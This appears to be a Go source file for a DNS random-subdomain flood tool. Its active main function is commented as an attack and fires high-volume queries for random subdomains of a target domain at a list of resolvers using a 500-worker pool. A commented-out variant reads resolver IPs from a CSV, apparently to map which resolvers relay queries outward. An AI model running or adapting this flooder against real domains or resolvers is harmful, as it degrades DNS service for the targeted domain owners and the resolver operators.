package main

import (
	"github.com/miekg/dns"
	"github.com/panjf2000/ants/v2"
	"github.com/schollz/progressbar/v3"
	"github.com/thanhpk/randstr"
	"os"
	"strconv"
	"strings"
	"sync"
)

// 攻击
func main() {
	defer ants.Release()

	var wg sync.WaitGroup

	p, _ := ants.NewPool(500, ants.WithPreAlloc(true))

	c := new(dns.Client)
	args := os.Args
	qname := args[1]
	runcount, _ := strconv.Atoi(args[2])
	bar := progressbar.Default(int64(runcount*len(args[3:])), "发包进度")
	for i := runcount; i > 0; i-- {
		for _, v := range args[3:] {
			wg.Add(1)

			fqdn := strings.ToLower(randstr.String(10)) + "." + qname

			print(fqdn + "\n")
			msg := dns.Msg{}
			msg.SetQuestion(fqdn, dns.TypeA)
			vi := v + ":53"

			_ = p.Submit(
				func() {
					_, _, err := c.Exchange(&msg, vi)
					wg.Done()
					if err != nil {
						return
					}
				})
			bar.Add(1)
		}
	}
	wg.Wait()
	print("完成！！")
}

// 测试入口出口关联
// func main() {
// 	defer ants.Release()

// 	var wg sync.WaitGroup

// 	p, _ := ants.NewPool(100, ants.WithPreAlloc(true))

// 	c := new(dns.Client)
// 	args := os.Args
// 	// 目标域名
// 	qname := args[0]
// 	// 目标文件路径
// 	qpath := args[1]
// 	// 运行次数
// 	runcount, _ := strconv.Atoi(args[2])

// 	f, err := os.Open(qpath)
// 	if err != nil {
// 		log.Fatal(err)
// 	}
// 	defer f.Close()
// 	// read csv values using csv.Reader
// 	csvReader := csv.NewReader(f)
// 	// 进度条初始化
// 	r := bufio.NewReader(f)
// 	num := 0
// 	for {
// 		_, err := r.ReadString('\n')
// 		if io.EOF == err || nil != err {
// 			break
// 		}
// 		num += 1
// 	}
// 	bar := progressbar.Default(int64(num))

// 	for i := runcount; i > 0; i-- {
// 		for {
// 			wg.Add(1)

// 			// 逐行读取
// 			rec, err := csvReader.Read()
// 			if err == io.EOF {
// 				break
// 			}
// 			if err != nil {
// 				log.Fatal(err)
// 			}

// 			fqdn := strings.ReplaceAll(rec[0], ":", "-") + "." + qname

// 			msg := dns.Msg{}
// 			msg.SetQuestion(fqdn, dns.TypeA)
// 			vi := rec[0] + ":53"

// 			_ = p.Submit(
// 				func() {
// 					_, _, err := c.Exchange(&msg, vi)
// 					wg.Done()
// 					if err != nil {
// 						return
// 					}
// 				})
// 			bar.Add(1)
// 		}
// 	}
// 	wg.Wait()
// 	print("完成！！")
// }
